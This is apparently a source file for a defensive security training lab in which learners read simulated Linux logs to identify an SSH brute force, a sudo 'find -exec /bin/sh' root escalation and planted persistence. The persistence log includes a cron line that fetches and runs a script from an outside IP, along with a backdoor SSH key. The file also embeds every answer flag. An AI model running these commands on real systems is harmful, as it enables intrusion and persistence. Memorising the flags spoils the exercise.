"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";
import { HintPanel } from "./hint-panel";

type AuthRow = {
  id: number;
  time: string;
  user: string;
  ip: string;
  result: "Failed" | "Accepted";
  detail: string;
};

const AUTH_LOG: AuthRow[] = [
  { id: 1, time: "03:14:02", user: "root", ip: "185.220.101.9", result: "Failed", detail: "Failed password for root from 185.220.101.9 port 51221 ssh2\nPAM: authentication failure for root from 185.220.101.9" },
  { id: 2, time: "03:14:03", user: "root", ip: "185.220.101.9", result: "Failed", detail: "Failed password for root from 185.220.101.9 port 51230 ssh2" },
  { id: 3, time: "03:14:05", user: "admin", ip: "185.220.101.9", result: "Failed", detail: "Failed password for admin from 185.220.101.9 port 51244 ssh2" },
  { id: 4, time: "03:15:41", user: "svc_backup", ip: "185.220.101.9", result: "Failed", detail: "Failed password for svc_backup from 185.220.101.9 port 51902 ssh2\n(...212 further attempts for svc_backup omitted...)" },
  { id: 5, time: "03:19:57", user: "svc_backup", ip: "185.220.101.9", result: "Accepted", detail: "Accepted password for svc_backup from 185.220.101.9 port 52310 ssh2\npam_unix(sshd:session): session opened for user svc_backup by (uid=0)" },
];

const SUDO_LOG = `svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\; ;
sh: session opened for user root by svc_backup(uid=1002)

Context: /etc/sudoers.d/backup-jobs grants svc_backup:
  svc_backup ALL=(root) NOPASSWD: /usr/bin/find`;

const PERSISTENCE_LOG = `[/var/spool/cron/crontabs/root]
*/5 * * * * curl -s http://185.220.101.9/update.sh | bash

[/root/.ssh/authorized_keys — new entry appended 03:24:18]
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKj3x... backdoor@185.220.101.9`;

function checkFlag(value: string, expected: string): boolean {
  const strip = (s: string) => s.trim().replace(/^SAGE\{/i, "").replace(/\}$/, "").toLowerCase();
  return strip(value) === strip(expected);
}

export function LinuxAuthInvestigationClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [expanded, setExpanded] = useState<number | null>(null);
  const [t1Choice, setT1Choice] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Choice, setT2Choice] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Answer, setT3Answer] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    if (t1Choice === "SSH Brute Force") {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Look at the volume of failures against different accounts from one source IP, ending in a success.");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (t2Choice === "GTFOBins sudo shell escape") {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. `find ... -exec /bin/sh` is a documented technique for escaping restricted sudo permissions.");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    if (checkFlag(t3Answer, "SAGE{cr0n_4nd_ssh_k3y_p3rsist3nce}")) {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect. Two separate persistence mechanisms were planted — name the pair using the flag format.");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 */}
      <TaskShell number={1} title="Detect the Brute Force" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          <code className="text-amber-300">/var/log/auth.log</code> on <code className="text-amber-300">db-prod01</code> shows
          a burst of SSH authentication activity from a single source. Click any row to expand the raw log line.
        </p>
        <div className="rounded-lg border border-white/8 mb-2 overflow-hidden">
          <table className="w-full text-xs font-mono">
            <thead>
              <tr className="border-b border-white/8 bg-zinc-900">
                <th className="px-3 py-2 text-left text-zinc-500">Time</th>
                <th className="px-3 py-2 text-left text-zinc-500">User</th>
                <th className="px-3 py-2 text-left text-zinc-500">Source IP</th>
                <th className="px-3 py-2 text-left text-zinc-500">Result</th>
              </tr>
            </thead>
            <tbody>
              {AUTH_LOG.map((row) => (
                <>
                  <tr
                    key={row.id}
                    onClick={() => setExpanded(expanded === row.id ? null : row.id)}
                    className={`border-b border-white/5 cursor-pointer transition-colors ${
                      row.result === "Accepted" ? "bg-green-950/30 text-green-300 hover:bg-green-950/50" : "text-red-300 hover:bg-red-950/20"
                    } ${expanded === row.id ? "bg-white/5" : ""}`}
                  >
                    <td className="px-3 py-2">{row.time}</td>
                    <td className="px-3 py-2">{row.user}</td>
                    <td className="px-3 py-2">{row.ip}</td>
                    <td className="px-3 py-2">{row.result} <span className="ml-2 text-zinc-600">{expanded === row.id ? "▲" : "▼"}</span></td>
                  </tr>
                  {expanded === row.id && (
                    <tr key={`${row.id}-d`} className="border-b border-white/5">
                      <td colSpan={4} className="px-4 py-3 bg-zinc-950">
                        <pre className="text-xs text-amber-300 whitespace-pre-wrap leading-relaxed">{row.detail}</pre>
                      </td>
                    </tr>
                  )}
                </>
              ))}
            </tbody>
          </table>
        </div>
        <p className="text-xs text-zinc-500 mb-4">217 total failed attempts across 3 accounts from 185.220.101.9, ending in a successful login as svc_backup.</p>

        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What is happening in this log?</p>
            <div className="flex flex-wrap gap-3">
              {["Kerberoasting", "SSH Brute Force", "DNS Tunneling", "SQL Injection"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t1" value={opt} checked={t1Choice === opt} onChange={() => setT1Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
            <HintPanel labId={labId} stage="task_1" />
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">Correct — 217 failures then a success = successful SSH brute force. Flag: SAGE&#123;ssh_brut3_f0rc3_succ3ss&#125;</p>
        )}
      </TaskShell>

      {/* Task 2 */}
      <TaskShell number={2} title="Identify the Sudo Abuse" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          Once in as <code className="text-amber-300">svc_backup</code>, the attacker checked <code className="text-amber-300">sudo -l</code> and
          found a NOPASSWD entry. This is what followed.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{SUDO_LOG}</pre>
        </div>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What technique did the attacker use to become root?</p>
            <div className="flex flex-wrap gap-3">
              {["Pass-the-Hash", "Kernel exploit", "GTFOBins sudo shell escape", "SUID binary hijack"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t2" value={opt} checked={t2Choice === opt} onChange={() => setT2Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
            <HintPanel labId={labId} stage="task_2" />
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">Correct — sudo find with -exec spawns a root shell. Flag: SAGE&#123;gtf0b1ns_sud0_3scap3&#125;</p>
        )}
      </TaskShell>

      {/* Task 3 */}
      <TaskShell number={3} title="Find the Persistence" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          With root, the attacker planted two separate ways to keep access even if the password is reset.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{PERSISTENCE_LOG}</pre>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">Name both persistence mechanisms as a flag: SAGE&#123;cr0n_and_ssh_&#8230;&#125;</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput value={t3Answer} onChange={setT3Answer} placeholder="SAGE{...}" className="flex-1" />
              <SubmitBtn label="Submit" />
            </div>
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
            <HintPanel labId={labId} stage="task_3" />
          </form>
        )}
        {done("task_3") && (
          <p className="text-sm font-mono text-sage-400">Correct — a root cron beacon plus a planted SSH key. Flag: SAGE&#123;cr0n_4nd_ssh_k3y_p3rsist3nce&#125;</p>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;ssh_brut3_f0rc3_succ3ss&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;gtf0b1ns_sud0_3scap3&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;cr0n_4nd_ssh_k3y_p3rsist3nce&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
